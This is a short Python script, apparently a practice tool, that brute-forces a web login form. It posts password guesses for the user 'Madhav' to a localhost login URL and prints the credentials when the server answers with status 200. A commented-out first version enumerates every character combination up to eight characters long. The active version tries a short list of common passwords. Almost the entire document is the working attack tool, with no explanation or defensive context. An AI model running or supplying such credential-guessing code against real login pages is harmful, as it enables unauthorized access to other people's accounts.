# import itertools
# import requests
# from tqdm import tqdm

# lowercase_chars = "abcdefghijklmnopqrstuvwxyz"
# uppercase_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
# numbers = "0123456789"
# special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/\\"

# max_length = 8

# username = "Madhav"
# target_url = "http://localhost:8000/login"

# all_characters = lowercase_chars + uppercase_chars + numbers + special_chars

# passwords = []
# for length in range(1, max_length + 1):
#     for combination in itertools.product(all_characters, repeat=length):
#         password = "".join(combination)
#         candidate = f"{username}{password}"
#         passwords.append(candidate)

# passwords2 = []
# for length in range(1, max_length + 1):
#     for combination in itertools.product(all_characters, repeat=length):
#         password = "".join(combination)
#         passwords2.append(password)

# combined_passwords = passwords + passwords2

# progress_bar = tqdm(total=len(combined_passwords), desc="Brute Forcing", unit="passwords")

# for password in combined_passwords:
#     data = {"username": username, "password": password}
#     response = requests.post(target_url, data=data)

#     if response.status_code == 200:
#         print(f"Login credentials found - Username: {username}, Password: {password}")
#         break

#     progress_bar.update(1)

# progress_bar.close()


import itertools
import requests
from tqdm import tqdm

lowercase_chars = "abcdefghijklmnopqrstuvwxyz"
uppercase_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
numbers = "0123456789"
special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/\\"

max_length = 8

username = "Madhav"
target_url = "http://localhost:8000/login"

all_characters = lowercase_chars + uppercase_chars + numbers + special_chars

passwords = ["password1", "password2", "password3", "abc123"]

progress_bar = tqdm(total=len(passwords), desc="Brute Forcing", unit="passwords")

for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(target_url, data=data)

    if response.status_code == 200:
        print(f"Login credentials found - Username: {username}, Password: {password}")
        break

    progress_bar.update(1)

progress_bar.close()
